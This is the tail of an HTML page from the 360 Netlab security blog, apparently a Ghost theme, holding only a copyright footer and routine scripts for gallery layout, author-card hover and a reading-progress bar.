                <section class="copyright"><a href="https://blog.netlab.360.com">360 Netlab Blog - Network Security Research Lab at 360</a> © 2022</section>
                <nav class="site-footer-nav">
                    <a href="https://blog.netlab.360.com">Latest Posts</a>
                    
                    <a href="https://twitter.com/360Netlab" target="_blank" rel="noopener">Twitter</a>
                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
                </nav>
            </div>
        </footer>

    </div>


    <script>
        var images = document.querySelectorAll('.kg-gallery-image img');
        images.forEach(function (image) {
            var container = image.closest('.kg-gallery-image');
            var width = image.attributes.width.value;
            var height = image.attributes.height.value;
            var ratio = width / height;
            container.style.flex = ratio + ' 1 0%';
        })
    </script>


    <script src="https://code.jquery.com/jquery-3.2.1.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous">
    </script>
    <script type="text/javascript" src="/assets/built/jquery.fitvids.js?v=a1b70de19f"></script><iframe style="display: none;"></iframe>


    <script>
// Adds delay to author card dropups to disappear. This gives enough
// time for the user to interact with the author card while they move
// the mouse from the avatar to the card. Also makes space for the
// interacted avatar.
$(document).ready(function () {

    var hoverTimeout;

    $('.author-list-item').hover(function(){
        var $this = $(this);

        clearTimeout(hoverTimeout);

        $('.author-card').removeClass('hovered');
        $(this).children('.author-card').addClass('hovered');

    }, function() {
        var $this = $(this);

        hoverTimeout = setTimeout(function() {
            $this.children('.author-card').removeClass('hovered');
        }, 800);
    });

});
</script>

    <script>

        // NOTE: Scroll performance is poor in Safari
        // - this appears to be due to the events firing much more slowly in Safari.
        //   Dropping the scroll event and using only a raf loop results in smoother
        //   scrolling but continuous processing even when not scrolling
        $(document).ready(function () {
            // Start fitVids
            var $postContent = $(".post-full-content");
            $postContent.fitVids();
            // End fitVids

            var progressBar = document.querySelector('#reading-progress');
            var header = document.querySelector('.floating-header');
            var title = document.querySelector('.post-full-title');

            var lastScrollY = window.scrollY;
            var lastWindowHeight = window.innerHeight;
            var lastDocumentHeight = $(document).height();
            var ticking = false;

            function onScroll() {
                lastScrollY = window.scrollY;
                requestTick();
            }

            function onResize() {
                lastWindowHeight = window.innerHeight;
                lastDocumentHeight = $(document).height();
                requestTick();
            }

            function requestTick() {
                if (!ticking) {
                    requestAnimationFrame(update);
                }
                ticking = true;
            }

            function update() {
                var trigger = title.getBoundingClientRect().top + window.scrollY;
                var triggerOffset = title.offsetHeight + 35;
                var progressMax = lastDocumentHeight - lastWindowHeight;

                // show/hide floating header
                if (lastScrollY >= trigger + triggerOffset) {
                    header.classList.add('floating-active');
                } else {
                    header.classList.remove('floating-active');
                }

                progressBar.setAttribute('max', progressMax);
                progressBar.setAttribute('value', lastScrollY);

                ticking = false;
            }

            window.addEventListener('scroll', onScroll, { passive: true });
            window.addEventListener('resize', onResize, false);

            update();

        });
    </script>


    



</body></html>